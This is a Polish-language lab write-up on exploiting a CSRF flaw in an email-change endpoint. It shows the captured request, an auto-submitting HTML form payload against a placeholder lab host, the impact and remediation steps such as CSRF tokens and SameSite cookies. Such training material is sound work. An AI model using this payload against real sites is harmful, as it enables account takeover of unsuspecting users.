# Lab 01 - CSRF Vulnerability With No Defences

Topic: Request zmieniający stan chroniony tylko przez session cookie  
Focus: rozpoznanie braku CSRF tokena i odtworzenie requestu z zewnętrznej strony

## Goal

Wykonać atak CSRF w legalnym labie i zmienić adres email ofiary.

## Input I Controlled

Kontrolowanym inputem był parametr `email` w request body.

Atakujący kontrolował też zewnętrzny formularz HTML hostowany na exploit serverze.

## Co się stało

Przechwyciłem request zmiany emaila:

```http
POST /my-account/change-email
Content-Type: application/x-www-form-urlencoded
Cookie: session=...

email=wiener%40normal-user.net
```

Request zmieniał adres email użytkownika i nie zawierał CSRF tokena.

Utworzyłem zewnętrzny formularz HTML, który automatycznie wysyłał taki sam request:

```html
<form method="POST" action="https://LAB-HOST/my-account/change-email">
  <input type="hidden" name="email" value="test123@example.com">
</form>

<script>
  document.forms[0].submit();
</script>
```

Po zapisaniu payloadu na exploit serverze i wysłaniu go do ofiary lab został rozwiązany. Musiałem użyć nowej, unikalnej wartości emaila, ponieważ wcześniej użyte wartości mogły blokować ukończenie laba.

## Czego się nauczyłem

`POST` nie chroni przed CSRF. Złośliwa strona może stworzyć i automatycznie wysłać formularz.

Serwer zaakceptował request, ponieważ przeglądarka automatycznie dołączyła session cookie ofiary. Aplikacja nie miała tokena ani dodatkowej walidacji potwierdzającej intencję użytkownika.

## Wpływ

W prawdziwej aplikacji atakujący mógłby zmienić adres email ofiary. W zależności od aplikacji mogłoby to pomóc w przejęciu konta, nadużyciu resetu hasła albo niechcianej zmianie ustawień konta.

## Podsumowanie remediacji

Zobacz `../overview.md` dla ogólnej sekcji remediation.

Specyficznie dla tego laba:

- dodać silny CSRF token do formularza zmiany emaila,
- powiązać token z sesją użytkownika,
- walidować token po stronie serwera,
- odrzucać requesty bez tokena lub z błędnym tokenem,
- używać SameSite cookies jako dodatkowej warstwy defence-in-depth.

## Główna lekcja

Session cookie potwierdza, że przeglądarka jest uwierzytelniona. Nie potwierdza, że użytkownik świadomie wysłał request.
